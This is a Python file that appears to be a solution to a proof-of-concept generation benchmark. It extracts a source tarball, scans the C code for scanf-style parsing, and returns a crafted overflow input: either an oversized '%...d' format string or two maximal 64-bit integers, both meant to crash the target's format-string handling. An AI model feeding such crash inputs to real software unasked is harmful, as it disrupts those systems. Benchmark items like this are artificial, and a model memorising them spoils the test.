import os
import re
import tarfile
import tempfile
from typing import Optional


class Solution:
    def _looks_like_two_number_input(self, src_root: str) -> bool:
        patterns = [
            re.compile(r'\bscanf\s*\(\s*"[^"]*%[^"]*[diuxX]\s+%[^"]*[diuxX][^"]*"', re.S),
            re.compile(r'\bsscanf\s*\(\s*[^,]+,\s*"[^"]*%[^"]*[diuxX]\s+%[^"]*[diuxX][^"]*"', re.S),
        ]
        try:
            for dirpath, _, filenames in os.walk(src_root):
                for fn in filenames:
                    if not fn.lower().endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                        continue
                    p = os.path.join(dirpath, fn)
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    if not data:
                        continue
                    txt = data.decode("utf-8", "ignore")
                    for pat in patterns:
                        if pat.search(txt):
                            return True
        except Exception:
            return False
        return False

    def _extract_tarball(self, src_path: str, dst_dir: str) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                def is_within_directory(directory: str, target: str) -> bool:
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

                for member in tf.getmembers():
                    member_path = os.path.join(dst_dir, member.name)
                    if not is_within_directory(dst_dir, member_path):
                        continue
                    tf.extract(member, dst_dir)
            return True
        except Exception:
            return False

    def solve(self, src_path: str) -> bytes:
        # Default PoC: 40 bytes
        fmt = b"%922337203685477580.9223372036854775807d"

        # Heuristic: if the target seems to parse two integers from stdin, provide two-number input.
        # Keep values large in decimal digit count to trigger internal format-string construction overflow.
        # This branch is best-effort and may not be used.
        try:
            with tempfile.TemporaryDirectory() as td:
                if self._extract_tarball(src_path, td):
                    if self._looks_like_two_number_input(td):
                        # 18 digits + space + 19 digits + newline = 39 bytes; add one more digit to make it 40.
                        # Use 19 digits for both; still reasonable for parsers using 64-bit signed (may clamp).
                        return b"9223372036854775807 9223372036854775807"
        except Exception:
            pass

        return fmt